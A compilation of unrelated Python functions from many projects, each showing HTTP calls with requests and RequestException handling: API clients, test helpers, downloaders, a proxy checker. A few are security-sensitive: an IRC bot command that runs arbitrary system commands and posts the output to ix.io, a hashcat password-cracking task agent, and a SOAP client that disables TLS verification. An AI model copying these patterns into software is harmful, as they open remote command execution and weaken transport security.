def post(self, data):
        logger.info('%s: pushing "%s"',  self.__class__.__name__, data)
        url = '{}create_many/'.format(self.url) if self.use_batch else self.url
        try:
            response = self.session.post(url, json=data)
        except requests.RequestException:
            logger.exception(
                '%s: error during POST', self.__class__.__name__)
            return

        if 200 <= response.status_code < 300:
            pass  # Success.
        elif response.status_code == 400:
            # One or more data points were invalid.
            self.handle_error_response(data, response.json())
        else:
            try:
                response.raise_for_status()
            except requests.RequestException:
                logger.exception(
                    '%s: error during POST', self.__class__.__name__) 
**************************************
def test_GET_root():
    '''The server should accept a GET and return the form.'''
    print("Testing GET request.")
    uri = "http://localhost:8000/"
    try:
        r = requests.get(uri)
    except requests.RequestException as e:
        return ("Couldn't communicate with the server. ({})\n"
                "If it's running, take a look at its output.").format(e)
    if r.status_code == 501:
        return ("The server returned status code 501 Not Implemented.\n"
                "This means it doesn't know how to handle a GET request.\n"
                "(Is the correct server code running?)")
    elif r.status_code != 200:
        return ("The server returned status code {} instead of a 200 OK."
                ).format(r.status_code)
    elif not r.headers['content-type'].startswith('text/html'):
        return ("The server didn't return Content-type: text/html.")
    elif '<title>Bookmark Server</title>' not in r.text:
        return ("The server didn't return the form text I expected.")
    else:
        print("GET request succeeded!")
        return None 
**************************************
def _push_to_registry(self, namespace, repository, release, bundle, auth_token):
        push_uri = 'https://quay.io/cnr/api/v1/packages/%s/%s' % (namespace, repository)
        logger.info('Pushing bundle to %s' % push_uri)
        headers = {'Content-Type': 'application/json', 'Authorization': auth_token}
        json = {'blob': bundle, 'release': release, "media_type": "helm"}

        try:
            r = requests.post(push_uri, json=json, headers=headers)
        except requests.RequestException as e:
            msg = str(e)
            logger.error(msg)
            raise OpCourierQuayCommunicationError(msg)

        if r.status_code != 200:
            logger.error(r.text)

            try:
                r_json = r.json()
            except ValueError:
                r_json = {}

            msg = r_json.get('error', {}).get(
                'message', 'Failed to get error details.'
            )
            raise OpCourierQuayErrorResponse(msg, r.status_code, r_json) 
**************************************
def check_container_ready(self):
        """ Function that continuously checks if a container is ready.

        Note:
            This function should be wrapped in a `tenacity.retry` for
            continuously checking the status without failing.

        Raises:
            requests.RequestException: for any `requests` related exception.

        Returns:
            bool:
                ``True`` when the status is good. ``False`` if it cannot
                be verified or is in an unusable state.
        """
        self.logger.debug('checking selenium status')
        resp = requests.get(self._base_url, timeout=(1.0, 1.0))
        # retry on every exception
        resp.raise_for_status()
        return resp.status_code == requests.codes.ok 
**************************************
def api_call_get(self, url, data=None):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.get(cf_api_url + url, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_post(self, url, data=None):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.post(cf_api_url + url, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_delete(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.delete(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if not api_result['success']:
            raise self.APIError(api_result['errors'])
        return api_result 
**************************************
def api_call_patch(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.patch(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        return api_result 
**************************************
def api_call_put(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.put(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        elif api_result['errors']:
            raise self.APIError(str(api_result['errors']))
        return api_result

    ################################################################
    #  Zone (https://api.cloudflare.com/#zone)                     #
    ################################################################

    #  Get all zones 
**************************************
def main():
    log.info('Cap breaker agent initializing...')
    working_folder = os.getenv('APPDATA') + '\\.capbreaker' if os.name == 'nt' else os.path.expanduser(
        '~') + '/.capbreaker'
    log.info('Server: ' + Config.server)
    log.info('Local working folder is set to: ' + working_folder)
    log.info('Scanning mode: ' + str(Config.hashcat_mode))
    hashcat = Hashcat(working_folder, Config.hashcat_url, Config.hashcat_mode)
    log.info('Done.\n')

    while True:
        log.info('Looking for a new task.')
        try:
            response = requests.post(Config.server + '/agent/getTask', auth=(Config.username, Config.password))
        except requests.RequestException:
            log.fatal('Unable connect to server. Please try again later. Exiting...')
            sleep(2)
            break
        if response.status_code == 200:
            log.info('Task found, starting scan...')
            hashcat.scan(response.json())
            sleep(3)
        elif response.status_code == 204:
            log.warning('Task not found, will try again in 60 seconds.')
            sleep(60)
        else:
            log.fatal('Unexpected error occurred. Exiting...')
            sleep(2)
            break 
**************************************
def validate_href(image_href):
        """Validate HTTP image reference.

        :param image_href: Image reference.
        :raises: exception.ImageRefValidationFailed if HEAD request failed or
            returned response code not equal to 200.
        :returns: Response to HEAD request.
        """
        try:
            response = requests.head(image_href)
            if response.status_code != http_client.OK:
                raise exception.ImageRefValidationFailed(
                    image_href=image_href,
                    reason=("Got HTTP code %s instead of 200 in response to "
                            "HEAD request." % response.status_code))
        except requests.RequestException as e:
            raise exception.ImageRefValidationFailed(image_href=image_href,
                                                     reason=e)
        return response 
**************************************
def request(self, endpoint, method="GET", file=None, params=None):
        url = self.api_url + endpoint
        params.update({"apikey": self.apikey})

        try:
            with requests.Session() as s:
                if method == "GET":
                    response = s.get(url, params=params)
                else:
                    response = s.post(url, files=file, data=params)
        except requests.RequestException as e:
            raise e

        content = ""
        if len(response.content) > 0:
            content = json.loads(response.content.decode("utf-8"))

        return content 
**************************************
def request(self, endpoint, method="GET", file=None, params=None):
        url = self.api_url + endpoint
        params.update({"apikey": self.apikey})

        try:
            with requests.Session() as s:
                if method == "GET":
                    response = s.get(url, params=params)
                else:
                    response = s.post(url, files=file, data=params)
        except requests.RequestException as e:
            raise e

        content = ""
        if len(response.content) > 0:
            content = json.loads(response.content.decode("utf-8"))

        return content 
**************************************
def send_msg(self, _type, url, message, **kwargs):
        response = None
        try:
            if _type == 'post':
                response = requests.post(url, headers=WebClient.headers, data=message, **kwargs)
            elif _type == 'put':
                response = requests.put(url, headers=WebClient.headers, data=message, **kwargs)
            elif _type == 'get':
                response = requests.get(url, headers=WebClient.headers, data=message, **kwargs)
            else:
                response = requests.delete(url, headers=WebClient.headers, data=message, **kwargs)
        except requests.RequestException as exception:
            logger.info('Requests fail - exception %s', exception)
            response = None
        finally:
            reply = self.__process_msg_response(response)
            logger.info('Requests - response %s', response)
            if reply:
                return reply.text
            return reply 
**************************************
def obtain_access_token(self):
        """Returns an OAuth 2 access token to make OAuth 2 authenticated
        read-only calls.

        :rtype: string
        """
        if self.oauth_version != 2:
            raise TwythonError('This method can only be called when your \
                               OAuth version is 2.0.')

        data = {'grant_type': 'client_credentials'}
        basic_auth = HTTPBasicAuth(self.app_key, self.app_secret)
        try:
            response = self.client.post(self.request_token_url,
                                        data=data, auth=basic_auth)
            content = response.content.decode('utf-8')
            try:
                content = content.json()
            except AttributeError:
                content = json.loads(content)
                access_token = content['access_token']
        except (KeyError, ValueError, requests.exceptions.RequestException):
            raise TwythonAuthError('Unable to obtain OAuth 2 access token.')
        else:
            return access_token 
**************************************
def bot(message: str, user_config: dict):
    if config['enable_bot'] and user_config['bot_notice']:
        try:
            group_id = user_config['group_id']
        except KeyError:
            group_id = config['group_id']
        # 传入JSON时，应使用这个UA
        headers = {'Content-Type': 'application/json',
                   'Authorization': f'Bearer {config["bot_token"]}'}
        for _group_id in group_id:
            _msg = {
                'group_id': int(_group_id),
                'message': message,
                'auto_escape': False
            }
            msg = json.dumps(_msg)
            logger = logging.getLogger('run.bot')
            try:
                requests.post(f'http://{config["bot_host"]}/send_group_msg', data=msg, headers=headers)
                logger.warning(f'{msg}')
            except requests.exceptions.RequestException as e:
                logger.exception(e) 
**************************************
def request_html(url, method='GET', headers=None, proxies=None):
    """
    :param url:
    :param method:
    :param headers:
    :param proxies:
    :return:
    """
    resp = None
    try:
        r = requests.request(method, url, headers=headers, proxies=proxies)
        if r.status_code == 200:
            resp = r.text
    except requests.RequestException as e:
        print(e)

    return resp 
**************************************
def __login(self):
        """Login using account-based or key-based methods."""
        if self.__session is None:
            self.__session = requests.session()

        login_url = "/".join([self.__url, "login"])
        try:
            response = self.__session.request(
                method="POST",
                url=login_url,
                data=self.__login_params,
                verify=self.__verify_ssl,
                timeout=self.__timeout,
                proxies=None,
            )
        except requests.RequestException as e:
            raise CommunicationError(e)

        self.__handle_response(response) 
**************************************
def exec(self, mask, target, args):
        """Run a system command and upload the output to ix.io.

            %%exec <command>...
        """

        try:
            output = _exec_wrapper(args['<command>'])
            if not output:
                return f'{mask.nick}: Command returned no output.'

            # Don't paste single line outputs.
            if not is_multiline_string(output):
                return f'{mask.nick}: {output}'

            # Upload result of command to ix.io to avoid flooding channels with long output.
            result = requests.post('http://ix.io', data={'f:1': output})

        except (FileNotFoundError, requests.RequestException, subprocess.TimeoutExpired) as ex:
            return f'{mask.nick}: {ex}'

        return f'{mask.nick}: {result.text}' 
**************************************
def request(self, host, handler, request_body, verbose):
        """
        Make an xmlrpc request.
        """
        headers = {'User-Agent': self.user_agent,
                   #Proxy-Connection': 'Keep-Alive',
                   #'Content-Range': 'bytes oxy1.0/-1',
                   'Accept': 'text/xml',
                   'Content-Type': 'text/xml' }
        url = self._build_url(host, handler)
        try:
            resp = requests.post(url, data=request_body, headers=headers)
        except ValueError:
            raise
        except Exception:
            raise # something went wrong
        else:
            try:
                resp.raise_for_status()
            except requests.RequestException as e:
                raise xmlrpc.ProtocolError(url, resp.status_code,
                                                        str(e), resp.headers)
            else:
                return self.parse_response(resp) 
**************************************
def get_password(self, hash_start: str) -> list:
        """
        :param hash_start: The first 5 characters of a SHA1 hash
        :return: A list of hashes that match the hash_start param
        """
        BASE_URl = 'https://api.pwnedpasswords.com/range/'

        url = BASE_URl + hash_start
        try:
            response = requests.get(url)
        except requests.RequestException as e:
            self.logger.error(e)
            raise
        hash_list = response.text.splitlines()
        hash_list = [hash_start + hash_ for hash_ in hash_list]
        hash_list = [hash_[:40] for hash_ in hash_list]
        return hash_list 
**************************************
def _get_data(self):
        try:
            res = requests.get('http://dynamisch.citybikewien.at/citybike_xml.php')
        except RequestException or HTTPError:  # retry on error
            logger.error("Caught RequestException")
            res = requests.get('http://dynamisch.citybikewien.at/citybike_xml.php')
        res.raise_for_status()
        root = ET.fromstring(res.text)
        citybikewien_data = []

        # extract only wanted stations and parse to citybikewien dict
        conf = get_config()
        stations = conf['api']['citybikewien']['stations']
        for station_xml in root.findall('station'):
            if station_xml.find('id').text in list(map(lambda s: str(s['id']), stations)):
                citybikewien_data.append({
                    'id': station_xml.find('id').text,
                    'name': station_xml.find('name').text,
                    'bikes': station_xml.find('free_bikes').text,
                    'status': station_xml.find('status').text
                })

        # rename stations to names from config, so they can be mapped with other api data by name
        for conf_station in stations:
            if 'rename' in conf_station:
                for station in citybikewien_data:
                    if station['id'] == str(conf_station['id']):
                        station['name'] = conf_station['rename']
                        break

        logger.info("updated data: %s" % citybikewien_data)
        self.data = citybikewien_data 
**************************************
def _new_session(self):
        self.header = {'Channel': 'inet'}
        try:
            res = requests.get('https://tickets.oebb.at/api/domain/v3/init',
                               headers=self.header,
                               params={'userId': 'anonym-%s-%s-%s' % (_gen_rnd_str(8), _gen_rnd_str(4), _gen_rnd_str(2))})
        except RequestException or HTTPError:  # retry on error
            res = requests.get('https://tickets.oebb.at/api/domain/v3/init',
                               headers=self.header,
                               params={'userId': 'anonym-%s-%s-%s' % (_gen_rnd_str(8), _gen_rnd_str(4), _gen_rnd_str(2))})
        res.raise_for_status()
        auth = res.json()
        logger.debug('autenticated: %s' % auth)
        self.header.update(
            {'AccessToken': auth['accessToken'], 'SessionId': auth['sessionId'], 'x-ts-supportid': auth['supportId']})
        self.session_end = time.time() + auth['sessionTimeout'] 
**************************************
def _hook_release_created(**kwargs):
    if kwargs.get('created'):
        release = kwargs['instance']
        # append release lifecycle logs to the app
        release.app.log(release.summary)

        for deploy_hook in settings.DEIS_DEPLOY_HOOK_URLS:
            url = deploy_hook
            params = {
                'app': release.app,
                'release': 'v{}'.format(release.version),
                'release_summary': release.summary,
                'sha': '',
                'user': release.owner,
            }
            if release.build is not None:
                params['sha'] = release.build.sha

            # order of the query arguments is important when computing the HMAC auth secret
            params = sorted(params.items())
            url += '?{}'.format(urllib.parse.urlencode(params))

            headers = {}
            if settings.DEIS_DEPLOY_HOOK_SECRET_KEY is not None:
                headers['Authorization'] = hmac.new(
                    settings.DEIS_DEPLOY_HOOK_SECRET_KEY.encode('utf-8'),
                    url.encode('utf-8'),
                    hashlib.sha1
                ).hexdigest()

            try:
                get_session().post(url, headers=headers)
                # just notify with the base URL, disregard the added URL query
                release.app.log('Deploy hook sent to {}'.format(deploy_hook))
            except requests.RequestException as e:
                release.app.log('An error occurred while sending the deploy hook to {}: {}'.format(
                    deploy_hook, e), logging.ERROR)


# Log significant app-related events 
**************************************
def CheckURI(uri, timeout=5):
    '''Check whether this URI is reachable, i.e. does it return a 200 OK?

    This function returns True if a GET request to uri returns a 200 OK, and
    False if that GET request returns any other response, or doesn't return
    (i.e. times out).
    '''
    try:
        r = requests.get(uri, timeout=timeout)
        # If the GET request returns, was it a 200 OK?
        return r.status_code == 200
    except requests.RequestException:
        # If the GET request raised an exception, it's not OK.
        return False 
**************************************
def test_request_exception_compatibility(op_courier_exception):
    """Test that exceptions replacing RequestException are backwards compatible"""
    assert (
        issubclass(op_courier_exception, RequestException)
        and not issubclass(op_courier_exception, ValueError)
    ) 
**************************************
def request_transaction(self, transaction: Transaction) -> Transaction:
        data = {
            'payer_number': transaction.meta.get('payer_number'),
            'payer_name': transaction.meta.get('payer_name'),
            'amount': transaction.amount,
            'note': transaction.meta.get('note'),
            'silent': transaction.meta.get('silent')
        }
        for key in ('payer_name', 'payer_number', 'note'):
            if data[key] is None:
                raise ValueError('Transaction meta required (%s)' % key)
        url = '%s/bills' % self._server_url
        headers = {
            'access-token': self.config['access_token'],
            'content-type': 'application/json'
        }
        try:
            response = request(
                'post', url, json=[data], headers=headers
            )
        except RequestException:
            raise GatewayNetworkError('Cannot connect to bahamta server.')

        if response.status_code != 200:
            raise TransactionError(
                'Invalid transaction information (%s)' % response.status_code
            )
        response_data = response.json()[0]
        transaction.id = response_data['bill_id']
        transaction.meta = response_data
        return transaction 
**************************************
def verify_transaction(self, transaction: Transaction, data):
        url = '%s/bills/%s' % (self._server_url, transaction.id)
        headers = {
            'access-token': self.config['access_token'],
            'content-type': 'application/json'
        }
        try:
            response = request('get', url, headers=headers)
        except RequestException:
            raise GatewayNetworkError('Cannot connect to bahamta server.')

        if response.status_code != 200:
            raise TransactionError(
                'Invalid transaction information (%s)' % response.status_code
            )
        response_data = response.json()

        if response_data['state'] != 'pay':
            raise TransactionError('Transaction not paid')

        if int(transaction.amount) != int(response_data['amount']):
            raise TransactionError('Amount mismatch')

        transaction.pan = response_data['pay_pan']
        transaction.meta = response_data
        return transaction 
**************************************
def is_working_url(self, url):
        try:
            response = requests.head(url,
                                     timeout=self.url_check_timeout,
                                     verify=self.verify_ssl)
            matches = []
            if response.status_code not in EXCEPTION_STATUS_CODES:
                matches = \
                    [re.match(pattern, str(response.status_code)) is not None
                     for pattern in INVALID_STATUS_CODES_REGEX]
            return True not in matches, response.status_code
        except Timeout:
            return False, 408
        except (RequestException, Exception):
            return False, None 
**************************************
def _get_repo(self, org, repo):
        """Either return the repo dictionary, or None if it doesn't exists.

        Args:
            org (str): Organization the repo lives in.
            repo (str): The name of the repo.
        Raises:
            requests.exceptions.RequestException
            GitHubUnknownError
        Returns:
            dict or None: Repo dictionary from github
                (https://developer.github.com/v3/repos/#get) or None if it
                doesn't exist.
        """
        repo_url = '{url}repos/{org}/{repo}'.format(
            url=self.api_url,
            org=org,
            repo=repo
        )

        # Try and get the URL, if it 404's we are good, otherwise raise
        repo_response = self.session.get(repo_url)
        if repo_response.status_code == 200:
            return repo_response.json()
        if repo_response.status_code != 404:
            raise GitHubUnknownError(repo_response.text) 
**************************************
def create_repo(self, org, repo, description):
        """Creates a new github repository or raises exceptions

        Args:
            org (str): Organization to create the repo in.
            repo (str): Name of the repo to create.
            description (str): Description of repo to use.
        Raises:
            GitHubRepoExists
            GitHubUnknownError
            requests.exceptions.RequestException
        Returns:
            dict: Github dictionary of a repo
                (https://developer.github.com/v3/repos/#create)

        """
        repo_dict = self._get_repo(org, repo)
        if repo_dict is not None:
            raise GitHubRepoExists('This repository already exists')

        # Everything looks clean, create the repo.
        create_url = '{url}orgs/{org}/repos'.format(
            url=self.api_url,
            org=org
        )
        payload = {
            'name': repo,
            'description': description,
            'private': True,
        }
        repo_create_response = self.session.post(create_url, json=payload)
        if repo_create_response.status_code != 201:
            raise GitHubUnknownError(repo_create_response.text)
        return repo_create_response.json() 
**************************************
def _create_team(self, org, team_name, read_only):
        """Internal function to create a team.

        Args:
            org (str): Organization to create the repo in.
            team_name (str): Name of team to create.
            read_only (bool): If false, read/write, if true read_only.

        Raises:
            GitHubUnknownError
            requests.RequestException
        Returns:
            dict: Team dictionary
                  (https://developer.github.com/v3/orgs/teams/#response)
        """
        if read_only:
            permission = 'pull'
        else:
            permission = 'push'

        create_url = '{url}orgs/{org}/teams'.format(
            url=self.api_url,
            org=org
        )
        response = self.session.post(create_url, json={
            'name': team_name,
            'permission': permission
        })
        if response.status_code != 201:
            raise GitHubUnknownError(response.text)
        return response.json() 
**************************************
def add_team_repo(self, org, repo, team):
        """Add a repo to an existing team (by name) in the specified org.

        We first look up the team to get its ID
        (https://developer.github.com/v3/orgs/teams/#list-teams), and
        then add the repo to that team
        (https://developer.github.com/v3/orgs/teams/#add-team-repo).

        Args:
            org (str): Organization to create the repo in.
            repo (str): Name of the repo to create.
            team (str): Name of team to add.
        Raises:
            GitHubNoTeamFound
            GitHubUnknownError
            requests.exceptions.RequestException

        """
        found_team = self._find_team(org, team)
        team_repo_url = '{url}teams/{id}/repos/{org}/{repo}'.format(
            url=self.api_url,
            id=found_team['id'],
            org=org,
            repo=repo
        )
        response = self.session.put(team_repo_url)
        if response.status_code != 204:
            raise GitHubUnknownError(response.text) 
**************************************
def add_web_hook(self, org, repo, url):
        """Adds an active hook to a github repository.

        This utilizes
        https://developer.github.com/v3/repos/hooks/#create-a-hook to
        create a form type Web hook that responds to push events
        (basically all the defaults).

        Args:
            org (str): Organization to create the repo in.
            repo (str): Name of the repo the hook will live in.
            url (str): URL of the hook to add.
        Raises:
            GitHubUnknownError
            requests.exceptions.RequestException
        Returns:
            dict: Github dictionary of a hook
                (https://developer.github.com/v3/repos/hooks/#response-2)

        """
        hook_url = '{url}repos/{org}/{repo}/hooks'.format(
            url=self.api_url,
            org=org,
            repo=repo
        )
        payload = {
            'name': 'web',
            'active': True,
            'config': {
                'url': url,
            }
        }
        response = self.session.post(hook_url, json=payload)
        if response.status_code != 201:
            raise GitHubUnknownError(response.text)
        return response.json() 
**************************************
def _send_stuf_message(stuf_msg: str, soap_action: str):
    """
    Send a STUF message to the server that is configured.
    """
    if not settings.SIGMAX_AUTH_TOKEN or not settings.SIGMAX_SERVER:
        raise SigmaxException('SIGMAX_AUTH_TOKEN or SIGMAX_SERVER not configured.')

    # Prepare our request to Sigmax
    encoded = stuf_msg.encode('utf-8')

    headers = {
        'SOAPAction': soap_action,
        'Content-Type': 'text/xml; charset=UTF-8',
        'Authorization': 'Basic ' + settings.SIGMAX_AUTH_TOKEN,
        'Content-Length': b'%d' % len(encoded)
    }

    # Send our message to Sigmax. Network problems, and HTTP status codes
    # are all raised as errors.
    try:
        response = requests.post(
            url=settings.SIGMAX_SERVER,
            headers=headers,
            data=encoded,
            verify=False
        )
        response.raise_for_status()
    except requests.RequestException as e:
        raise SigmaxException from e

    # Inspect response content with lxml, check for Fo03/Bv03. Raise if we
    # receive anything other than XML or a message `berichtcode` other than
    # StUF Bv03.
    if not _stuf_response_ok(response):
        raise SigmaxException('Geen Bv03 ontvangen van Sigmax/CityControl')

    return response 
**************************************
def __next__(self):
        while not self._event_complete() and not self.requestClose:
            try:
                nextchar = next(self.resp.iter_content(decode_unicode=True))
                self.buf += nextchar
            except (StopIteration, requests.RequestException):
                time.sleep(self.retry / 1000.0)
                self._connect()

                # The SSE spec only supports resuming from a whole message, so
                # if we have half a message we should throw it out.
                head, sep, tail = self.buf.rpartition('\n')
                self.buf = head + sep
                continue

        split = re.split(end_of_field, self.buf)
        head = split[0]
        tail = "".join(split[1:])

        self.buf = tail
        msg = Event.parse(head)

        # If the server requests a specific retry delay, we need to honor it.
        if msg.retry:
            self.retry = msg.retry

        # last_id should only be set if included in the message.  It's not
        # forgotten if a message omits it.
        if msg.id:
            self.last_id = msg.id

        return msg 
**************************************
def download_illust(artwork: Artwork, folder: str = '') -> Iterator[Tuple[Artwork.DownloadStatus, str]]:
        artwork_detail = texts.DOWNLOAD_INITIALIZE_FAILED
        folder = str(folder)
        if folder and not os.path.isdir(folder):
            os.mkdir(folder)
        try:
            for status, url_and_headers, filename in artwork:
                url, headers = url_and_headers
                page_num_search = re.search(r'\d{8}_p(\d*)', url)
                page_num = page_num_search.group(1) if page_num_search else -1
                filename = os.path.join(util.clean_filename(str(folder)), util.clean_filename(str(filename)))
                artwork_detail = f'[{str(artwork.title)}] p{page_num} {texts.get("BY")} [{str(artwork.author)}]'
                if status is Artwork.DownloadStatus.OK:

                    if os.path.isfile(filename):
                        yield Artwork.DownloadStatus.SKIPPED, artwork_detail
                        continue

                    with requests.get(url=url, headers=headers) as r:
                        r.raise_for_status()
                        with open(filename, 'wb') as file:
                            for chunk in r.iter_content(chunk_size=1024):
                                file.write(chunk)
                    yield Artwork.DownloadStatus.OK, artwork_detail

                else:
                    yield Artwork.DownloadStatus.FAILED, artwork_detail

        except requests.RequestException as e:
            yield Artwork.DownloadStatus.FAILED, artwork_detail + f': {e}' 
**************************************
def download_illust(artwork: Artwork, folder: str = '') -> Iterator[Tuple[Artwork.DownloadStatus, str]]:
        artwork_detail = 'None'
        folder = str(folder)
        if folder and not os.path.isdir(folder):
            os.mkdir(folder)
        try:
            for status, url_and_headers, filename in artwork:
                url, headers = url_and_headers
                page_num_search = re.search(r'\d{8}_p(\d*)', url)
                page_num = page_num_search.group(1) if page_num_search else -1
                filename = os.path.join(util.clean_filename(str(folder)), util.clean_filename(str(filename)))
                artwork_detail = f'[{str(artwork.title)}] p{page_num} by [{str(artwork.author)}]'
                if status is Artwork.DownloadStatus.OK:

                    if os.path.isfile(filename):
                        yield Artwork.DownloadStatus.SKIPPED, artwork_detail
                        continue

                    with requests.get(url=url, headers=headers) as r:
                        r.raise_for_status()
                        with open(filename, 'wb') as file:
                            for chunk in r.iter_content(chunk_size=1024):
                                file.write(chunk)
                    yield Artwork.DownloadStatus.OK, artwork_detail

        except requests.RequestException as e:
            yield Artwork.DownloadStatus.FAILED, artwork_detail + f': {e}' 
**************************************
def _hack_ip():
    system = _system()
    if system not in SUPPORTED_SYSTEMS:
        return False, 'Unknown operation system {0}'.format(system)

    local_ip = public_ip = DEFAULT_IP_ADDRESS
    if system == 'Darwin':
        command = ['ifconfig']
        pattern = re.compile(r'inet (?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    elif system == 'Linux':
        command = ['ip', 'addr']
        pattern = re.compile(r'inet (?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    else:
        command = ['ipconfig']
        pattern = re.compile(r'IPv4.+: (?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    rs = _exec(command)
    for match in re.finditer(pattern, rs):
        sip = match.group('ip')
        if sip != DEFAULT_IP_ADDRESS:
            local_ip = sip
            break
    try:
        r = requests.get(VERIFY_HOST)
        public_ip = r.json()['origin']
    except requests.RequestException:
        pass
    return True, '{0}\n{1}'.format(local_ip, public_ip) 
**************************************
def test_exceptions(self):
        import requests

        exceptions = requests_.RequestsClient.exceptions

        with pytest.raises(exceptions.BaseClientException):
            raise requests.RequestException()

        with pytest.raises(exceptions.BaseClientException):
            # Test polymorphism
            raise requests.exceptions.InvalidURL()

        with pytest.raises(exceptions.ConnectionError):
            raise requests.exceptions.ConnectionError()

        with pytest.raises(exceptions.ConnectionTimeout):
            raise requests.exceptions.ConnectTimeout()

        with pytest.raises(exceptions.ServerTimeout):
            raise requests.exceptions.ReadTimeout()

        with pytest.raises(exceptions.SSLError):
            raise requests.exceptions.SSLError()

        with pytest.raises(exceptions.InvalidURL):
            raise requests.exceptions.InvalidURL() 
**************************************
def request(self, endpoint, method='GET', params=None):
        """Returns dict of response from OANDA's open API
        :param endpoint: (required) OANDA API endpoint (e.g. v1/instruments)
        :type endpoint: string
        :param method: (optional) Method of accessing data, either GET or POST. (default GET)
        :type method: string
        :param params: (optional) Dict of parameters (if any) accepted the by OANDA API endpoint you are trying to access (default None)
        :type params: dict or None
        """

        url = '%s/%s' % ( self.api_url, endpoint)

        method = method.lower()
        params = params or {}

        func = getattr(self.client, method)

        request_args = {}
        if method == 'get':
            request_args['params'] = params
        else:
            request_args['data'] = params

        try:
            response = func(url, **request_args)
        except requests.RequestException as e:
            print (str(e))
        content = response.content.decode('utf-8')

        content = json.loads(content)

        # error message
        if response.status_code >= 400:
            raise OandaError(content)

        return content 
**************************************
def _fetch_access_token(self, url, params):
        """ The real fetch access token """
        res = requests.get(
            url=url,
            params=params
        )
        try:
            res.raise_for_status()
        except requests.RequestException as reqe:
            raise WeChatClientException(
                errcode=None,
                errmsg=None,
                client=self,
                request=reqe.request,
                response=reqe.response
            )
        result = res.json()
        if 'errcode' in result and result['errcode'] != 0:
            raise WeChatClientException(
                result['errcode'],
                result['errmsg'],
                client=self,
                request=res.request,
                response=res
            )

        expires_in = 7200
        if 'expires_in' in result:
            expires_in = result['expires_in']
        self.session.set(
            self.access_token_key,
            result['access_token'],
            expires_in
        )
        self.expires_at = int(time.time()) + expires_in
        return result 
**************************************
def _request(self, method, url_or_endpoint, **kwargs):
        if not url_or_endpoint.startswith(('http://', 'https://')):
            api_base_url = kwargs.pop('api_base_url', self.API_BASE_URL)
            url = '{base}{endpoint}'.format(
                base=api_base_url,
                endpoint=url_or_endpoint
            )
        else:
            url = url_or_endpoint

        if 'params' not in kwargs:
            kwargs['params'] = {}
        if isinstance(kwargs['params'], dict) and \
                'component_access_token' not in kwargs['params']:
            kwargs['params'][
                'component_access_token'] = self.access_token
        if isinstance(kwargs['data'], dict):
            kwargs['data'] = json.dumps(kwargs['data'])

        res = requests.request(
            method=method,
            url=url,
            **kwargs
        )
        try:
            res.raise_for_status()
        except requests.RequestException as reqe:
            raise WeChatClientException(
                errcode=None,
                errmsg=None,
                client=self,
                request=reqe.request,
                response=reqe.response
            )

        return self._handle_result(res, method, url, **kwargs) 
**************************************
def do_request(self, req, timeout):
        try:
            return Response(self.session.request(req.method, req.url,
                                                 data=req.data,
                                                 params=req.params,
                                                 headers=req.headers,
                                                 stream=True,
                                                 timeout=timeout))
        except requests.RequestException as e:
            raise RequestError(e) 
**************************************
def _check(self, ip, port, save_to_queue=False):
        """
        检测给定的代理IP和端口是否存活
        :param ip: 代理IP
        :param port: 代理端口
        :param save_to_queue: 如果设置为True，则存储到结果队列中，否则不存储，默认为False
        :return: success, delay 如果目标代理存活，则success为True且delay为延迟，否则为False，delay为0
        """
        # 检查参数合法性
        if ip == "" or port == "":
            logger.error("Invalid ip or port found. Skipping...")
            return False, -1.0

        # 3次重试机会
        retry = 3
        time_summary = 0.0
        success = False
        while retry:
            logger.debug("Times: {0}. Trying {1}:{2} connection...".format(3-retry+1, ip, port))
            proxies = {
                'http': ip + ":" + port
            }

            try:
                time_start = time.time()
                requests.get("http://ip.cn/", headers=self.headers, proxies=proxies, timeout=10)
                time_summary = time.time() - time_start
                success = True
                break
            except requests.RequestException:
                logger.warning("{0}:{1} proxy time out.".format(ip, port))
                continue
            finally:
                retry -= 1
        if save_to_queue:
            self.result_queue.put((ip, port, success, time_summary))
        return success, time_summary 
**************************************
